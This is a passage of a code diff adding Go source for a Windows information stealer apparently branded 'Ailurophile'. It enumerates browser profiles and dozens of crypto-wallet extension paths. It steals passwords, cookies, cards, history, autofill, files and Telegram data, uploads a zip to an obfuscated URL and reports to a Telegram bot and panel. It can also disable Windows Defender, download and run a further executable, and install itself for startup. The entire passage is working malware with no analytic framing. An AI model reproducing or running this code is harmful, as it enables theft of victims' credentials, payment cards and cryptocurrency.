+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc\\Browser\\User Data\\Profile 4\\"), "Profile_4", filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc\\Browser\\User Data\\")},
+		{filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc\\Browser\\User Data\\Profile 5\\"), "Profile_5", filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc\\Browser\\User Data\\")}}
+	browserrootPaths :=  [][]string{
+	{"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "Chrome Default"},
+	{"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", "Brave Default"},
+	{"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "Edge Default"},
+	{"C:\\Program Files\\Opera\\opera.exe", "Opera Default"},
+	{"C:\\Program Files\\Vivaldi\\Application\\vivaldi.exe", "Vivaldi Default"},
+	{"C:\\Program Files\\Yandex\\YandexBrowser\\Application\\browser.exe", "Yandex Default"},
+	{"C:\\Program Files (x86)\\CocCoc\\Browser\\Application\\browser.exe", "CocCoc Default"},
+	{"C:\\Program Files\\Ungoogled Chromium\\Application\\chrome.exe", "Ungoogled Chromium"},
+	{"C:\\Program Files\\Epic Privacy Browser\\Application\\epic.exe", "Epic Privacy Browser"},
+	{"C:\\Program Files\\Blisk\\Application\\blisk.exe", "Blisk Default"},
+}
+	browserInfo := checkBrowsersExistence(browserrootPaths)
+	browserInfoStr := strings.Join(browserInfo, "\n")	
+	
+	walletPaths := map[string]string{
+		"Metamask":        filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"),
+		"Coinbase":        filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"),
+		"Cara":       	   filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mdjmfdffdcmnoblignmgpommbefadffd"),
+		"BinanceChain":    filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"),
+		"Phantom":         filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ghbmnnjooekpmoecnnnilnnbdlolhkhi"),
+		"TronLink":        filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"),
+		"Ronin":           filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"),
+		"Exodus":          filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"),
+		"Coin98":          filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"),
+		"Authenticator":   filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"),
+		"MathWallet":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"),
+		"YoroiWallet":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"),
+		"GuardaWallet":    filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"),
+		"JaxxxLiberty":    filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"),
+		"Wombat":          filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"),
+		"EVERWallet":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"),
+		"KardiaChain":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"),
+		"XDEFI":           filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
+		"Nami":            filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"),
+		"TerraStation":    filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"),
+		"MartianAptos":    filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"),
+		"TON":             filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"),
+		"Keplr":           filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"),
+		"CryptoCom":       filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj"),
+		"PetraAptos":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"),
+		"OKX":             filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge"),
+		"Sollet":          filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"),
+		"Sender":          filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg"),
+		"Sui":             filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil"),
+		"SuietSui":        filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd"),
+		"Braavos":         filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma"),
+		"FewchaMove":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"),
+		"EthosSui":        filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli"),
+		"ArgentX":         filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb"),
+		"NiftyWallet":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"),
+		"BraveWallet":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl"),
+		"EqualWallet":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"),
+		"BitAppWallet":    filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"),
+		"iWallet":         filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"),
+		"AtomicWallet":    filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"),
+		"MewCx":           filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
+		"GuildWallet":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"),
+		"SaturnWallet":    filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"),
+		"HarmonyWallet":   filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"),
+		"PaliWallet":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"),
+		"BoltX":           filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"),
+		"LiqualityWallet": filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"),
+		"MaiarDeFiWallet": filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"),
+		"TempleWallet":    filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"),
+		"Metamask_E":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"),
+		"Ronin_E":         filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk"),
+		"Yoroi_E":         filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb"),
+		"Authenticator_E": filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio"),
+		"MetaMask_O":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci"),
+	}
+	var finalUploadURL string
+	decodedURL, err := base64.StdEncoding.DecodeString(config.UploadURL)
+	if err != nil {
+	return
+	}
+	decryptedURL, err := ailurophileDecrypt(string(decodedURL), config.KeyDecrypt)
+	if err != nil {
+	return
+}
+	if decodedFinalURL, err := base64.StdEncoding.DecodeString(decryptedURL); err == nil {
+	finalUploadURL = string(decodedFinalURL)
+} else {
+	finalUploadURL = decryptedURL
+}
+	
+	width, height, err := getScreenResolution()
+	if err != nil {
+		log.Fatalf("Error: %v", err)
+	}
+
+	
+	
+	message := fmt.Sprintf(
+		"IP: %s\nCountry: %s\nHostname: %s\nPC Type: %s\nArchitecture: %s\nFile Path: %s\nMain Path: %s\nAllowed Extensions: %v\nFolders to Search: %v\nFiles: %v\nMAC Address: %v\nScreen Resolution: %dx%d\nBrowsers:\n%s\n",
+		ipInfo["ip"].(string), ipInfo["country"].(string), hostname, pcType, arch, filePath, mainPath, allowedExtensions, foldersToSearch, files, mac, width, height, browserInfoStr,
+	)
+	err = getInfo(message, mainPath)
+	if err != nil {
+	} else {
+	}
+	killProcess()
+	getEncrypted(&browserPaths)
+	count := getAutofill(browserPaths, mainPath)
+	totalHistoryEntries := getHistory(browserPaths, mainPath)
+	totalCookies := getCookies(browserPaths, mainPath)
+	totalPassword := getPasswords(browserPaths, mainPath)
+	totalCardsFound := getCards(browserPaths, mainPath)
+	totalFilesStolen := stealFiles(allowedExtensions, foldersToSearch, files, mainPath)
+	check_telegram := ""
+	check_wallet := ""
+	if submitTelegram(mainPath) {
+		check_telegram = "yes"
+	} else {
+		check_telegram = "no"
+	}
+	result := localWalletData(mainPath, walletPaths)
+	if result == 1 {
+		check_wallet = "yes"
+	} else {
+		check_wallet = "no"
+	}
+	zipFilePath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Ailurophile.zip")
+	err = zipFolder(mainPath, zipFilePath)
+	if err != nil {
+		return
+	}
+	data := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(`{"user_id":"%s","hostname":"%s","ip":"%s","type":"%s","passwords":"%d","cookies":"%d","autofills":"%d","cards":"%d","files":"%d","country":"%s","wallet":"%d","history":"%d"}`, 
+	config.UserID, hostname, ipInfo["ip"].(string), pcType, totalPassword, totalCookies, count, totalCardsFound, totalFilesStolen, ipInfo["country"].(string), result, totalHistoryEntries)))
+	encryptedData := ailurophileEncrypt(data, config.KeyDecrypt)
+	finalData := base64.StdEncoding.EncodeToString([]byte(encryptedData))
+	fullUrl := finalUploadURL + "data=" + finalData + "&hash=" + config.KeyDecrypt
+	uploadFileZip(zipFilePath, fullUrl)
+	message2 := fmt.Sprintf(`
+🌐 <b>IP:</b> %s
+🏳 <b>Country:</b> %s
+💻 <b>Hostname:</b> %s
+🖥 <b>PC Type:</b> %s
+🏗 <b>Architecture:</b> %s
+📁 <b>File Path:</b> %s
+🏠 <b>Main Path:</b> %s
+🗂 <b>Allowed Extensions:</b> %v
+📂 <b>Folders to Search:</b> %v
+📄 <b>Files:</b> %v
+
+🔍 <b>Found %d autofill entries</b>
+📜 <b>Total history entries found:</b> %d
+🍪 <b>Total cookies found:</b> %d
+🔑 <b>Total password found:</b> %d
+💳 <b>Total cards found:</b> %d
+📦 <b>Total files stolen:</b> %d
+
+💬 <b>Telegram:</b> %s
+💰 <b>Crypto Wallet:</b> %s
+
+<a href='https://ailurophilestealer.com/bot'> Download at Panel </a>
+`,
+	ipInfo["ip"].(string), ipInfo["country"].(string), hostname, pcType, arch, filePath, mainPath, allowedExtensions, foldersToSearch, files,
+	count, totalHistoryEntries, totalCookies, totalPassword, totalCardsFound, totalFilesStolen, check_telegram, check_wallet,
+)
+	sendToTelegram(config.TelegramToken, config.ChatID, message2)
+	deleteFile(zipFilePath)
+	deleteFolder(mainPath)
+
+	if config.Delivery == "1" {
+	DisableWD()
+	}
+	if config.StubURL != "" {
+	
+	randomFileName, err := randomString(10)
+	if err != nil {
+	}
+	localPath := filepath.Join(os.Getenv("APPDATA"), randomFileName+".exe")
+
+	err = DownloadFile(config.StubURL, localPath)
+	if err != nil {
+	}
+	err = ExecuteFile(localPath)
+	if err != nil {
+	}
+	}
+	if config.Startup == "1" {
+	destinationPath, err := copySelfToLocalApp()
+	if err != nil {
+		return
+	}
+	err = setAutoStartup(destinationPath)
+	if err != nil {
+		return
+	}
+	}
+
+}
